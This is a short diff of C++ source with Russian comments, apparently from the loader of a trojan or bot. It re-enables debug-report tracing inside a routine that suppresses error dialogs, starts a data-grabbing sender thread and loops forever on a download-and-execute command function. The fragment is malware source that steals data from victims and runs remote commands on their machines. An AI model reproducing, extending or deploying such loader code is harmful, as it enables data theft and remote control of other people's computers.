@@ -115,7 +115,7 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	DisableShowFatalErrorDialog();
 
 	// Инициализируем систему отправки статистической информации
-	//PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
+	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
 
 	// Вызываем событие
 	bool Cancel = false;
@@ -126,7 +126,7 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	}
 
 	// 402_pl запуск цикла получения команд (он получается в другом процессе)
-	//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));
+	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));
 
 	// Запускаем поток отправки данных
 	DataGrabber::StartDataSender();
@@ -154,7 +154,7 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 		while (true)
 		{
 			// 403_pl цикл получения команд
-			//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
+			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
 			
 			DownloadAndExecuteCommand(NULL, NULL);
 
